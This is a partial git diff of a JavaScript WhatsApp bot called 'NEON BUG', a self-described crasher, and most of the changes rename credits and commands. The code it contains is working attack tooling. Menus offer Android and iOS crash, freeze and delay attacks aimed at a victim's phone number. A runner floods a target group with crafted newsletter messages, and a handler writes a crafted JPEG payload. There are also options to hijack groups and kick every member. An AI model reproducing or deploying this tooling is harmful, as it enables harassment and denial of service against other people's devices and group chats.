@@ -1,8 +1,8 @@
 /*
  * ============================================
- * CASE.JS - NEON BUG
- * Created by: VICTORY TECH 
- * Telegram: @victory_is_h1m
+ * NEON.JS - NEON BUG
+ * Created by: NEON BUG 
+ * Telegram: NEON BUG
  * ============================================
  */
 
@@ -20,7 +20,7 @@ const baileysReady = import('baileys').then((baileys) => {
   ({ generateWAMessageContent, generateWAMessageFromContent, generateMessageID, proto } = baileys);
   return baileys;
 });
-const { handleAntiFeatures, handleAntiRaid, getExternalAdReply, createFakeQuote } = require('./lib/anti-features');
+const { handleAntiFeatures, handleNeonGroupGuard, getExternalAdReply, createFakeQuote } = require('./lib/anti-features');
 const {
   getOwnerPrefix,
   resolveOwnerNumber,
@@ -40,8 +40,8 @@ console.log(chalk.red(`
 ██║ ╚████║███████╗╚██████╔╝██║ ╚████║    ██████╔╝╚██████╔╝╚██████╔╝
 ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═════╝  ╚═════╝  ╚═════╝
 `));
-console.log(chalk.red('☠️  NEON BUG - VICTORY TECH ☠️'));
-console.log(chalk.white('    Created by: VICTORY TECH|  Telegram: ☠︎」*NEON* 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝘃𝟭.𝟬'));
+console.log(chalk.red('☠️  NEON BUG - NEON BUG ☠️'));
+console.log(chalk.white('    Created by: NEON BUG|  Telegram: ☠︎」*NEON* 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝘃𝟭.𝟬'));
 console.log(chalk.red('☠️'.repeat(40)));
 console.log('');
 
@@ -156,7 +156,7 @@ const getNewsletterTag = () => ({
   isForwarded: true,
   forwardingScore: 1,
   entryPointConversionSource: `Ends on ${getExpiryDate()}`,
-  entryPointConversionApp: 'Code: 「☠︎」 VICTORY TECH',
+  entryPointConversionApp: 'Code: 「☠︎」 NEON BUG',
 });
 
 console.log(chalk.green('✅ 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 helpers initialized'));
@@ -188,8 +188,8 @@ async function sendPlainMenu(sock, chatId, fakeQuote, prefix, reason = '') {
 async function sendMainMenu(sock, chatId, fakeQuote, prefix) {
 
   // ── Load media ──
-  const menuImagePath = path.join(__dirname, '..', 'Assets', 'menu.jpg');
-  const menuVideoPath = path.join(__dirname, '..', 'Assets', 'menu.mp4');
+  const menuImagePath = path.join(__dirname, '..', 'assets', 'menu.jpg');
+  const menuVideoPath = path.join(__dirname, '..', 'assets', 'menu.mp4');
 
   let mediaBuffer = null;
   let mediaType = null;
@@ -221,7 +221,7 @@ async function sendMainMenu(sock, chatId, fakeQuote, prefix) {
 
   // ── Body caption ──
   const menuCaption =
-    `「☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬 · ʙʏ @victory_is_h1m「☠︎」\n` +
+    `「☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬 · ʙʏ NEON BUG「☠︎」\n` +
     `WHO DECIDED THATa`;
 
   // ── 🏷️ tag card via messageParamsJson ──
@@ -229,7 +229,7 @@ async function sendMainMenu(sock, chatId, fakeQuote, prefix) {
     limited_time_offer: {
       text: '☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬',
       url: DEVELOPER_LINK,
-      copy_code: '「☠︎」VICTORY TECH',
+      copy_code: '「☠︎」NEON BUG',
       expiration_time: Date.now() * 999
     }
   });
@@ -271,13 +271,13 @@ async function sendMainMenu(sock, chatId, fakeQuote, prefix) {
                   sections: [
                     {
                       title: '𓆙 𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬',
-                      highlight_label: 'Night Raiders',
+                      highlight_label: 'NEON BUG',
                       rows: [
                         {
                           header: '𓅓META BUGS',
                           title: '𓅓META Bugs',
                           description: 'Android · iOS · GC attack commands',
-                          id: 'open_raid_bugs'
+                          id: 'open_neon_modules'
                         },
                         {
                           header: '𓅓SYSTEM',
@@ -330,7 +330,7 @@ async function sendCategoryMenu(sock, chatId, fakeQuote) {
                 name: 'cta_reply',
                 buttonParamsJson: JSON.stringify({
                   display_text: '「☠︎」Meta Bugs',
-                  id: 'open_raid_bugs'
+                  id: 'open_neon_modules'
                 })
               },
               {
@@ -428,23 +428,23 @@ async function sendRaidBugsMenu(sock, chatId, fakeQuote) {
                     {
                       title: '「☠︎」 Android Bugs',
                       rows: [
-                        { header: '「☠︎」ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ',    title: '「☠︎」ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ',    description: 'Android crash attack',   id: 'btn_raidandroid'   },
-                        { header: '「☠︎」ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ', title: '「☠︎」ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ', description: 'Android freeze attack',  id: 'btn_devine-freeze' },
-                        { header: '「☠︎」ʀᴀɪᴅ-ᴅᴇʟᴀʏ',    title: '「☠︎」ʀᴀɪᴅ-ᴅᴇʟᴀʏ',    description: 'Android delay attack',   id: 'btn_raid-delay'    }
+                        { header: '「☠︎」ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ',    title: '「☠︎」ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ',    description: 'Android crash attack',   id: 'btn_neon-android'   },
+                        { header: '「☠︎」ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ', title: '「☠︎」ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ', description: 'Android freeze attack',  id: 'btn_neon-freeze' },
+                        { header: '「☠︎」ʀᴀɪᴅ-ᴅᴇʟᴀʏ',    title: '「☠︎」ʀᴀɪᴅ-ᴅᴇʟᴀʏ',    description: 'Android delay attack',   id: 'btn_neon-delay'    }
                       ]
                     },
                     {
                       title: '「☠︎」 iOS Bugs',
                       rows: [
-                        { header: '「☠︎」ʀᴀɪᴅɪᴏs',        title: '「☠︎」ʀᴀɪᴅɪᴏs',        description: 'iOS crash attack',        id: 'btn_raidios'        },
-                        { header: '「☠︎」ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ', title: '「☠︎」ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ', description: 'iOS invasion attack',     id: 'btn_night-invasion' },
-                        { header: '「☠︎」ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ',  title: '「☠︎」ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ',  description: 'iOS freeze attack',       id: 'btn_obito-freeze'   }
+                        { header: '「☠︎」ʀᴀɪᴅɪᴏs',        title: '「☠︎」ʀᴀɪᴅɪᴏs',        description: 'iOS crash attack',        id: 'btn_neon-ios'        },
+                        { header: '「☠︎」ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ', title: '「☠︎」ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ', description: 'iOS invasion attack',     id: 'btn_neon-invasion' },
+                        { header: '「☠︎」ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ',  title: '「☠︎」ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ',  description: 'iOS freeze attack',       id: 'btn_neon-obito'   }
                       ]
                     },
                     {
                       title: '「☠︎」 GC Bug',
                       rows: [
-                        { header: '「☠︎」ʀᴀɪᴅɢᴄ', title: '「☠︎」ʀᴀɪᴅɢᴄ', description: 'Group chat crash attack', id: 'btn_raidgc' }
+                        { header: '「☠︎」ʀᴀɪᴅɢᴄ', title: '「☠︎」ʀᴀɪᴅɢᴄ', description: 'Group chat crash attack', id: 'btn_neon-gc' }
                       ]
                     }
                   ]
@@ -544,7 +544,7 @@ async function sendSystemMenu(sock, chatId, fakeQuote) {
                     {
                       title: '「☠︎」 Protection',
                       rows: [
-                        { header: '「☠︎」ᴀɴᴛɪʙᴜɢ',  title: '「☠︎」ᴀɴᴛɪʙᴜɢ',  description: 'Toggle anti-bug',  id: 'btn_antibug'  },
+                        { header: '「☠︎」ᴀɴᴛɪʙᴜɢ',  title: '「☠︎」ᴀɴᴛɪʙᴜɢ',  description: 'Toggle anti-bug',  id: 'btn_neon-antibug'  },
                         { header: '「☠︎」ᴀɴᴛɪsᴘᴀᴍ', title: '「☠︎」ᴀɴᴛɪsᴘᴀᴍ', description: 'Toggle anti-spam', id: 'btn_antispam' },
                         { header: '「☠︎」ᴀɴᴛɪʙᴏᴛ',  title: '「☠︎」ᴀɴᴛɪʙᴏᴛ',  description: 'Toggle anti-bot',  id: 'btn_antibot'  }
                       ]
@@ -562,7 +562,7 @@ async function sendSystemMenu(sock, chatId, fakeQuote) {
                       rows: [
                         { header: '「☠︎」ʜɪᴊᴀᴄᴋ',   title: '「☠︎」ʜɪᴊᴀᴄᴋ',   description: 'Hijack group',      id: 'btn_hijack'   },
                         { header: '「☠︎」ᴋɪᴄᴋᴀʟʟ',  title: '「☠︎」ᴋɪᴄᴋᴀʟʟ',  description: 'Kick all members',  id: 'btn_kickall'  },
-                        { header: '「☠︎」ʀᴀɪᴅʟɪsᴛ', title: '「☠︎」ʀᴀɪᴅʟɪsᴛ', description: 'View raid list',    id: 'btn_raidlist' }
+                        { header: '「☠︎」ʀᴀɪᴅʟɪsᴛ', title: '「☠︎」ʀᴀɪᴅʟɪsᴛ', description: 'View raid list',    id: 'btn_neon-list' }
                       ]
                     },
                     {
@@ -621,7 +621,7 @@ async function handleButtonResponse(sock, chatId, sessionKey, buttonId, msg, isO
   switch (buttonId) {
 
     // ── MENUS NAV ──
-    case 'open_raid_bugs':
+    case 'open_neon_modules':
       await sendRaidBugsMenu(sock, chatId, fakeQuote);
       break;
 
@@ -629,32 +629,32 @@ async function handleButtonResponse(sock, chatId, sessionKey, buttonId, msg, isO
       await sendSystemMenu(sock, chatId, fakeQuote);
       break;
 
-    // ── RAID BUG BUTTONS ──
-    case 'btn_raidandroid':
-      await askForTarget(sock, chatId, sessionKey, 'raidandroid', 'RAIDANDROID 🤖', fakeQuote);
+    // ── NEON MODULE BUTTONS ──
+    case 'btn_neon-android':
+      await askForTarget(sock, chatId, sessionKey, 'neon-android', 'NEON ANDROID 🤖', fakeQuote);
       break;
 
-    case 'btn_devine-freeze':
-      await askForTarget(sock, chatId, sessionKey, 'devine-freeze', 'DEVINE-FREEZE 🤖', fakeQuote);
+    case 'btn_neon-freeze':
+      await askForTarget(sock, chatId, sessionKey, 'neon-freeze', 'NEON FREEZE 🤖', fakeQuote);
       break;
 
-    case 'btn_raid-delay':
-      await askForTarget(sock, chatId, sessionKey, 'raid-delay', 'RAID-DELAY 🤖', fakeQuote);
+    case 'btn_neon-delay':
+      await askForTarget(sock, chatId, sessionKey, 'neon-delay', 'NEON DELAY 🤖', fakeQuote);
       break;
 
-    case 'btn_raidios':
-      await askForTarget(sock, chatId, sessionKey, 'raidios', 'RAIDIOS 🍎', fakeQuote);
+    case 'btn_neon-ios':
+      await askForTarget(sock, chatId, sessionKey, 'neon-ios', 'NEON IOS 🍎', fakeQuote);
       break;
 
-    case 'btn_night-invasion':
-      await askForTarget(sock, chatId, sessionKey, 'night-invasion', 'NIGHT-INVASION 🍎', fakeQuote);
+    case 'btn_neon-invasion':
+      await askForTarget(sock, chatId, sessionKey, 'neon-invasion', 'NEON INVASION 🍎', fakeQuote);
       break;
 
-    case 'btn_obito-freeze':
-      await askForTarget(sock, chatId, sessionKey, 'obito-freeze', 'OBITO-FREEZE 🍎', fakeQuote);
+    case 'btn_neon-obito':
+      await askForTarget(sock, chatId, sessionKey, 'neon-obito', 'NEON OBITO 🍎', fakeQuote);
       break;
 
-    case 'btn_raidgc':
+    case 'btn_neon-gc':
       if (!isGroupMsg) {
         await sock.sendMessage(chatId, {
           text: `⚠️ ᴜsᴇ ʀᴀɪᴅɢᴄ ɪɴsɪᴅᴇ ᴀ ɢʀᴏᴜᴘ ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴀ ɢʀᴏᴜᴘ ᴊɪᴅ! ☠️`,
@@ -662,10 +662,10 @@ async function handleButtonResponse(sock, chatId, sessionKey, buttonId, msg, isO
         }, { quoted: fakeQuote });
       } else {
         await sock.sendMessage(chatId, {
-          text: `「☠︎」*RAIDGC 💀*\n\n☠️ ᴅᴇᴘʟᴏʏɪɴɢ ᴏɴ ᴛʜɪs ɢʀᴏᴜᴘ...`,
+          text: `「☠︎」*NEON GC 💀*\n\n☠️ ᴅᴇᴘʟᴏʏɪɴɢ ᴏɴ ᴛʜɪs ɢʀᴏᴜᴘ...`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
-        await runRaidGc(sock, chatId, chatId, fakeQuote);
+        await runNeonGc(sock, chatId, chatId, fakeQuote);
       }
       break;
 
@@ -692,7 +692,7 @@ async function handleButtonResponse(sock, chatId, sessionKey, buttonId, msg, isO
       }, { quoted: fakeQuote });
       break;
 
-    case 'btn_antibug': {
+    case 'btn_neon-antibug': {
       const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
       const ownerConfig = getOwnerConfig(ownerNumber);
       const current = ownerConfig?.antibug || false;
@@ -795,11 +795,11 @@ async function handleButtonResponse(sock, chatId, sessionKey, buttonId, msg, isO
       }
       break;
 
-    case 'btn_raidlist':
+    case 'btn_neon-list':
       if (!isGroupMsg) {
         await sock.sendMessage(chatId, { text: `⚠️ ᴜsᴇ ᴛʜɪs ɪɴsɪᴅᴇ ᴀ ɢʀᴏᴜᴘ ☠️`, contextInfo: adReply }, { quoted: fakeQuote });
       } else {
-        // Reuse raidlist logic inline
+        // Reuse neon-list logic inline
         const groupJid = chatId;
         const groupName = groupMetadata?.subject || 'Unknown';
         const memberCount = groupMetadata?.participants?.length || 0;
@@ -839,10 +839,10 @@ async function handleButtonResponse(sock, chatId, sessionKey, buttonId, msg, isO
 }
 
 // ============================================
-// RAIDGC RUNNER — lorddevine_newsletter (GC)
+// NEON GC RUNNER — lorddevine_newsletter (GC)
 // Targets a group JID with newsletter overflow
 // ============================================
-async function runRaidGc(sock, chatId, targetGcJid, fakeQuote) {
+async function runNeonGc(sock, chatId, targetGcJid, fakeQuote) {
   const adReply = getExternalAdReply();
 
   let sent = 0;
@@ -901,12 +901,12 @@ async function runRaidGc(sock, chatId, targetGcJid, fakeQuote) {
       }, { messageId: generateMessageID() });
 
       sent++;
-      console.log(chalk.green(`✅ raidgc [${i + 1}/${ROUNDS}] → ${targetGcJid}`));
+      console.log(chalk.green(`✅ neon-gc [${i + 1}/${ROUNDS}] → ${targetGcJid}`));
       await delay(300);
 
     } catch (e) {
       failed++;
-      console.warn(chalk.yellow(`⚠️ raidgc [${i + 1}/${ROUNDS}] failed: ${e.message}`));
+      console.warn(chalk.yellow(`⚠️ neon-gc [${i + 1}/${ROUNDS}] failed: ${e.message}`));
       await delay(500);
     }
   }
@@ -932,7 +932,7 @@ async function runRaidGc(sock, chatId, targetGcJid, fakeQuote) {
 module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
   await baileysReady;
   const botPhoneNumber = phoneNumber;
-  console.log(chalk.cyan(`「☠︎」RAID CRASHER initialized — Phone: ${phoneNumber || 'unknown'}, Owner: ${ownerChatId || 'unknown'}`));
+  console.log(chalk.cyan(`「☠︎」NEON BUG initialized — Phone: ${phoneNumber || 'unknown'}, Owner: ${ownerChatId || 'unknown'}`));
 
   // ============================================
   // EVENT: GROUP PARTICIPANTS (ANTIRAID ONLY)
@@ -940,7 +940,7 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
   sock.ev.on('group-participants.update', async ({ id, participants, action }) => {
     try {
       if (action === 'add') {
-        await handleAntiRaid(sock, id, participants, botPhoneNumber);
+        await handleNeonGroupGuard(sock, id, participants, botPhoneNumber);
       }
     } catch (err) {
       console.error(chalk.yellow('⚠️ Error in group participants update:'), err);
@@ -1115,7 +1115,7 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
               continue;
             }
 
-            await handlePendingRaidCommand(sock, chatId, session.command, rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
+            await handlePendingNeonCommand(sock, chatId, session.command, rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
             continue;
           }
         }
@@ -1287,7 +1287,7 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
           }
 
           // ── ANTIBUG ──
-          case 'antibug': {
+          case 'neon-antibug': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
@@ -1429,15 +1429,15 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
             break;
           }
 
-          // ── RAIDGC ──
-          case 'raidgc': {
+          // ── NEON GC ──
+          case 'neon-gc': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
             }
             if (isGroupMsg) {
               try { await sock.sendMessage(chatId, { react: { text: '「☠︎」', key: msg.key } }); } catch (_) {}
-              await runRaidGc(sock, chatId, chatId, fakeQuote);
+              await runNeonGc(sock, chatId, chatId, fakeQuote);
               try { await sock.sendMessage(chatId, { react: { text: '✅', key: msg.key } }); } catch (_) {}
             } else {
               const providedJid = args[0];
@@ -1451,14 +1451,14 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
                     `_「☠︎」ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs ʀᴀɪᴅɪɴɢ..._`,
                   contextInfo: getExternalAdReply()
                 }, { quoted: fakeQuote });
-                await runRaidGc(sock, chatId, providedJid, fakeQuote);
+                await runNeonGc(sock, chatId, providedJid, fakeQuote);
               } else {
                 await sock.sendMessage(chatId, {
                   text:
                     `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                     `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
-                    `*${prefix}raidgc 120363xxxxxxxxxx@g.us*\n\n` +
-                    `_💡 ᴜsᴇ *${prefix}raidlist* ɪɴsɪᴅᴇ ᴀ ɢʀᴏᴜᴘ ᴛᴏ ɢᴇᴛ ᴛʜᴇ ᴊɪᴅ_`,
+                    `*${prefix}neon-gc 120363xxxxxxxxxx@g.us*\n\n` +
+                    `_💡 ᴜsᴇ *${prefix}neon-list* ɪɴsɪᴅᴇ ᴀ ɢʀᴏᴜᴘ ᴛᴏ ɢᴇᴛ ᴛʜᴇ ᴊɪᴅ_`,
                   contextInfo: getExternalAdReply()
                 }, { quoted: fakeQuote });
               }
@@ -1466,134 +1466,134 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
             break;
           }
 
-          // ── RAIDIOS ──
-          case 'raidios': {
+          // ── NEON IOS ──
+          case 'neon-ios': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
             }
             if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
               const rawNum = args[0].replace(/[^0-9]/g, '');
-              await handlePendingRaidCommand(sock, chatId, 'raidios', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
+              await handlePendingNeonCommand(sock, chatId, 'neon-ios', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
             } else {
               await sock.sendMessage(chatId, {
                 text:
                   `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                   `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
-                  `*${prefix}raidios 2348xxxxxxxxx*`,
+                  `*${prefix}neon-ios 2348xxxxxxxxx*`,
                 contextInfo: getExternalAdReply()
               }, { quoted: fakeQuote });
             }
             break;
           }
 
-          // ── RAIDANDROID ──
-          case 'raidandroid': {
+          // ── NEON ANDROID ──
+          case 'neon-android': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
             }
             if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
               const rawNum = args[0].replace(/[^0-9]/g, '');
-              await handlePendingRaidCommand(sock, chatId, 'raidandroid', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
+              await handlePendingNeonCommand(sock, chatId, 'neon-android', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
             } else {
               await sock.sendMessage(chatId, {
                 text:
                   `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                   `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
-                  `*${prefix}raidandroid 2348xxxxxxxxx*`,
+                  `*${prefix}neon-android 2348xxxxxxxxx*`,
                 contextInfo: getExternalAdReply()
               }, { quoted: fakeQuote });
             }
             break;
           }
 
-          // ── DEVINE-FREEZE ──
-          case 'devine-freeze': {
+          // ── NEON FREEZE ──
+          case 'neon-freeze': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
             }
             if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
               const rawNum = args[0].replace(/[^0-9]/g, '');
-              await handlePendingRaidCommand(sock, chatId, 'devine-freeze', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
+              await handlePendingNeonCommand(sock, chatId, 'neon-freeze', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
             } else {
               await sock.sendMessage(chatId, {
                 text:
                   `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                   `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
-                  `*${prefix}devine-freeze 2348xxxxxxxxx*`,
+                  `*${prefix}neon-freeze 2348xxxxxxxxx*`,
                 contextInfo: getExternalAdReply()
               }, { quoted: fakeQuote });
             }
             break;
           }
 
-          // ── RAID-DELAY (NEW — PLACEHOLDER) ──
-          case 'raid-delay': {
+          // ── NEON DELAY (NEW — PLACEHOLDER) ──
+          case 'neon-delay': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
             }
             if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
               const rawNum = args[0].replace(/[^0-9]/g, '');
-              await handlePendingRaidCommand(sock, chatId, 'raid-delay', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
+              await handlePendingNeonCommand(sock, chatId, 'neon-delay', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
             } else {
               await sock.sendMessage(chatId, {
                 text:
                   `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                   `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
-                  `*${prefix}raid-delay 2348xxxxxxxxx*`,
+                  `*${prefix}neon-delay 2348xxxxxxxxx*`,
                 contextInfo: getExternalAdReply()
               }, { quoted: fakeQuote });
             }
             break;
           }
 
-          // ── NIGHT-INVASION (NEW — PLACEHOLDER) ──
-          case 'night-invasion': {
+          // ── NEON INVASION (NEW — PLACEHOLDER) ──
+          case 'neon-invasion': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
             }
             if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
               const rawNum = args[0].replace(/[^0-9]/g, '');
-              await handlePendingRaidCommand(sock, chatId, 'night-invasion', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
+              await handlePendingNeonCommand(sock, chatId, 'neon-invasion', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
             } else {
               await sock.sendMessage(chatId, {
                 text:
                   `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                   `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
-                  `*${prefix}night-invasion 2348xxxxxxxxx*`,
+                  `*${prefix}neon-invasion 2348xxxxxxxxx*`,
                 contextInfo: getExternalAdReply()
               }, { quoted: fakeQuote });
             }
             break;
           }
 
-          // ── OBITO-FREEZE (NEW — PLACEHOLDER) ──
-          case 'obito-freeze': {
+          // ── NEON OBITO (NEW — PLACEHOLDER) ──
+          case 'neon-obito': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
             }
             if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
               const rawNum = args[0].replace(/[^0-9]/g, '');
-              await handlePendingRaidCommand(sock, chatId, 'obito-freeze', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
+              await handlePendingNeonCommand(sock, chatId, 'neon-obito', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
             } else {
               await sock.sendMessage(chatId, {
                 text:
                   `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                   `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
-                  `*${prefix}obito-freeze 2348xxxxxxxxx*`,
+                  `*${prefix}neon-obito 2348xxxxxxxxx*`,
                 contextInfo: getExternalAdReply()
               }, { quoted: fakeQuote });
             }
             break;
           }
 
-          // ── RAIDLIST ──
-          case 'raidlist': {
+          // ── NEON LIST ──
+          case 'neon-list': {
             if (!isOwner && !isSudo) {
               await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
               break;
@@ -1620,7 +1620,7 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
                         `━━━━━━━━━━━━━━━━━━━━━━━━━━━`
                     }),
                     footer: proto.Message.InteractiveMessage.Footer.create({ text: '☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬' }),
-                    header: proto.Message.InteractiveMessage.Header.create({ title: '🎯 𝗥𝗔𝗜𝗗 𝗧𝗔𝗥𝗚𝗘𝗧', subtitle: toMathItalic('Night Raiders'), hasMediaAttachment: false }),
+                    header: proto.Message.InteractiveMessage.Header.create({ title: '🎯 𝗥𝗔𝗜𝗗 𝗧𝗔𝗥𝗚𝗘𝗧', subtitle: toMathItalic('NEON BUG'), hasMediaAttachment: false }),
                     nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                       buttons: [{
                         name: 'cta_copy',
@@ -1649,15 +1649,15 @@ module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
 }; // end module.exports
 
 // ============================================
-// PENDING RAID COMMAND HANDLER
+// PENDING NEON COMMAND HANDLER
 // ============================================
-async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum, fakeQuote) {
+async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum, fakeQuote) {
   const adReply = getExternalAdReply();
 
   switch (command) {
 
-    // ── RAIDIOS ──
-    case 'raidios': {
+    // ── NEON IOS ──
+    case 'neon-ios': {
       try {
         const axios    = require('axios');
         const FormData = require('form-data');
@@ -1698,7 +1698,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
 
         const tmpDir = path.join(__dirname, 'tmp');
         await fs.ensureDir(tmpDir);
-        const tmpFilePath = path.join(tmpDir, `raidios_${Date.now()}.jpg`);
+        const tmpFilePath = path.join(tmpDir, `neon-ios_${Date.now()}.jpg`);
         await fs.writeFile(tmpFilePath, craftedJpeg);
 
         let upscaledBuffer = craftedJpeg;
@@ -1733,7 +1733,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             }
           }
         } catch (upscaleErr) {
-          console.warn(chalk.yellow(`[raidios] Upscaler failed: ${upscaleErr.message}`));
+          console.warn(chalk.yellow(`[neon-ios] Upscaler failed: ${upscaleErr.message}`));
         }
 
         await fs.remove(tmpFilePath).catch(() => {});
